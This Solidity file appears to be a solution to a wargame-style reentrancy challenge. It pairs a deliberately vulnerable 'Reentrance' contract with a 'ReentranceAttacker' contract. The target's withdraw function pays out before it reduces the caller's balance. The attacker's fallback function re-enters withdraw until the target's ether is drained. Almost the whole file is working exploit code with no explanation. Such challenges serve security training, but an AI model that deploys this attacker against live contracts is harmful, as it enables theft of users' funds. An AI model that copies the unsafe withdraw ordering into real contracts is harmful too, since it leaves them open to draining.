// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./helpers/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call.value(_amount)("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceAttacker {
    Reentrance private reentrance;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public payable {
        // reentrance.donate{ value: msg.value, gas: 4000000 }(address(this));
        reentrance.donate.value(msg.value).gas(4000000)(address(this));
        reentrance.withdraw(msg.value);
        // payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(msg.value);
        }
    }
}